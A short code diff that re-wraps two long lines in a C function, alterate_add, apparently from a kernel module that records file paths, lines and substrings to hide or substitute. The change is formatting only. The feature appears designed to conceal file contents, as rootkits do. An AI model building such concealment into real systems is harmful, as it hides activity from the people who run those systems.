@@ -20,7 +20,8 @@ void alterate_exit(void) {
     ulist_clear(&alt_list);
 }
 
-int alterate_add(const char *path, int hide_line, const char *hide_substr, const char *src, const char *dst) {
+int alterate_add(const char *path, int hide_line, const char *hide_substr,
+                 const char *src, const char *dst) {
     int ret;
     char payload[512];
     char modpath[256];
@@ -37,7 +38,8 @@ int alterate_add(const char *path, int hide_line, const char *hide_substr, const
         modpath[len - 1] = '\0';
     }
 
-    scnprintf(payload, sizeof(payload), "%d:%s:%s:%s", hide_line, hide_substr ?: "", src ?: "", dst ?: "");
+    scnprintf(payload, sizeof(payload), "%d:%s:%s:%s", hide_line,
+              hide_substr ?: "", src ?: "", dst ?: "");
 
     ret = ulist_add(&alt_list, modpath, 0, payload);
     if (ret < 0)
